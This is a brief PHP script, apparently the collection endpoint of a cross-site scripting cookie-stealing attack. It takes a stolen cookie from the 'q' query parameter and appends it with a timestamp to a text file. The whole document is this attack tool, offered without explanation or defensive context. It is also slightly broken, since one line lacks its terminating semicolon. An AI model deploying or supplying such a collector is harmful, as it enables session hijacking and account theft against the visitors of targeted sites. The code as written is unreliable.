<?php
$cookie= $_GET['q'];
$time=date('y-m-d h:i:s',time());
$rec=$time."    ".$cookie."\n";
$myfile=fopen("newfile.txt", "a")
fwrite($myfile,$rec);
fclose($myfile);
?>
